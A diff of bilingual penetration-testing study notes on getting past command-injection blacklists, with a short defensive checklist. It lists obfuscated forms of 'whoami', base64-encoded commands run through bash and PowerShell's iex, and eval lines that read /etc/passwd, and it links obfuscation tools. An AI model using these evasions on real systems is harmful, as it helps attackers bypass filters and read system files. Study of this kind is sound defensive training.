@@ -31,11 +31,58 @@ If controls on back end:
     echo $(tr '!-}' '"-~'<<<[)      \            [ = 91, \ = 92
 
   绕过命令黑名单：
-    wh'o'am'i'
-    w"ho"a:mi"
+    wh'o'am'i'    both
+    w"ho"a:mi"    both
 
-    w\ho\am\i      only Linux
-    w^ho^am^i      only Windows
+    w\ho\am\i      Linux
+    w^ho^am^i      Windows
+
+    Windows is NOT case sensitive, Linux is:
+      21y4d@htb[/htb]$ $(tr%09"[A-Z]"%09"[a-z]"<<<"WhOaMi")      Linux, %09 is space      最外层的 $() 是命令替换语法。它的作用是：先运行括号内的命令，然后将输出结果放回到原来的位置作为新的命令来执行。
+
+      $(a="WhOaMi";printf %s "${a,,}")                           Linux 
+
+      ${a,,}全部字母转小写
+      ${a,}仅将首字母转小写
+      {a^^}全部字母转大写
+      {a^}仅将首字母转大写
+
+    echo 'whoami' | rev      Linux
+    $(rev<<<'imaohw')        Linux
+    "imaohw"[-1..-20] -join ''    Windows            take each letter from the end, then join
+
+
+    bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)      Linux      使用 <<< 是为了避免使用管道符 |，因为它是一个被过滤的字符。
+
+    iex "$([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('dwBoAG8AYQBtAGkA')))"      Windows      dwBoAG8AYQBtAGkA is base64 of whoami
+
+
+    cmd="cat"
+    file="/etc/passwd"
+    eval "$cmd $file"            cat /etc/passwd
+    
+      
+Tools:
+  https://github.com/Bashfuscator/Bashfuscator                Linux
+  https://github.com/danielbohannon/Invoke-DOSfuscation       Windows
+
+
+Defensive:
+  Use coding languages built-in filters
+
+  除了外部 WAF（例如 Cloudflare、Fortinet、Imperva 等）之外，还应使用 Web 服务器内置的 Web 应用防火墙 (Web Application Firewall, WAF)（例如 Apache 中的 mod_security）
+  遵守最小权限原则 (Principle of Least Privilege, PoLP)，以低权限用户（例如 www-data）身份运行 Web 服务器
+  禁止 Web 服务器执行某些函数（例如，在 PHP 中设置 disable_functions=system,...）
+  将 Web 应用程序可访问的范围限制在其文件夹内（例如，在 PHP 中设置 open_basedir = '/var/www/html'）
+  拒绝 URL 中的双重编码请求，和非 ASCII 字符（解码后）
+  避免使用敏感/过时的库和模块（例如 PHP CGI）
+
+
+
+In Linux:
+  code1 & code2:   run both
+  code1 && code2:  code2 only run if code1 true
+
 
 
 
